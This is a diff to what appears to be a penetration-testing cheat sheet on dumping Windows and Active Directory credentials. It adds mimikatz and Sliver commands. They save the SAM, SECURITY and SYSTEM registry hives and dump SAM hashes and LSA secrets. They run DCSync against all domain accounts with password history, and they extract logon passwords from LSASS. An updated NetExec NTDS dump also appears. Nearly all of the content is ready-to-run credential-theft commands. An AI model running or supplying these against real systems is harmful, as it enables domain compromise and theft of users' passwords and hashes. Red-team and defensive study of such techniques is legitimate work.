@@ -14,7 +14,7 @@ ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
 
 ### With ntds.dit and SYSTEM hive
 
-{{< tab set1 tab1 active >}}impacket{{< /tab >}}
+{{< tab set1 tab1 >}}impacket{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
@@ -42,7 +42,9 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
 
 ### With SAM, SYSTEM and SECURITY Hives
 
-{{< tab set2 tab1 active >}}impacket{{< /tab >}}
+{{< tab set2 tab1 >}}impacket{{< /tab >}}
+{{< tab set2 tab2 >}}mimikatz{{< /tab >}}
+{{< tab set2 tab3 >}}sliver{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 ```console
@@ -50,11 +52,59 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
 {{< /tabcontent >}}
+{{< tabcontent set2 tab2 >}}
+
+```console
+reg save HKLM\SYSTEM system
+```
+
+```console
+reg save HKLM\security security
+```
+
+```console
+reg save hklm\sam sam
+```
+
+```console
+.\mimikatz.exe "lsadump::secrets /system:SYSTEM /security:SECURITY"
+```
+
+```console
+.\mimikatz.exe "lsadump::sam /system:SYSTEM /sam:SAM"
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set2 tab3 >}}
+
+```console
+reg save HKLM\SYSTEM system
+```
+
+```console
+reg save HKLM\security security
+```
+
+```console
+reg save hklm\sam sam
+```
+
+```console
+mimikatz -- '"lsadump::secrets /system:C:\SYSTEM /security:C:\SECURITY"'
+```
+
+```console
+mimikatz -- '"lsadump::sam /system:C:\SYSTEM /sam:C:\SAM"'
+```
+
+{{< /tabcontent >}}
+
 
 ### With Dcsync right
 
-{{< tab set3 tab1 active >}}impacket{{< /tab >}}
+{{< tab set3 tab1 >}}impacket{{< /tab >}}
 {{< tab set3 tab2 >}}nxc{{< /tab >}}
+{{< tab set3 tab3 >}}mimikatz{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
 ```console
@@ -65,7 +115,46 @@ impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
 {{< tabcontent set3 tab2 >}}
 
 ```console
-nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set3 tab3 >}}
+
+```console
+.\mimikatz.exe "lsadump::dcsync /all" "exit"
+```
+
+```console
+# Dump old creds
+.\mimikatz.exe "lsadump::dcsync /user:<DOMAIN>\<USER> /history" "exit"
+```
+
+{{< /tabcontent >}}
+
+### With NT AUTHORITY\SYSTEM / Administrator
+
+{{< tab set4 tab1 >}}mimikatz{{< /tab >}}
+{{< tab set4 tab2 >}}sliver{{< /tab >}}
+{{< tabcontent set4 tab1 >}}
+
+```console
+.\mimikatz.exe "sekurlsa::logonpasswords"
+```
+
+```console
+.\mimikatz.exe "lsadump::lsa /patch"
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set4 tab2 >}}
+
+```console
+mimikatz -- '"sekurlsa::logonpasswords"'
+```
+
+```console
+mimikatz -- '"lsadump::lsa /patch"'
 ```
 
 {{< /tabcontent >}}
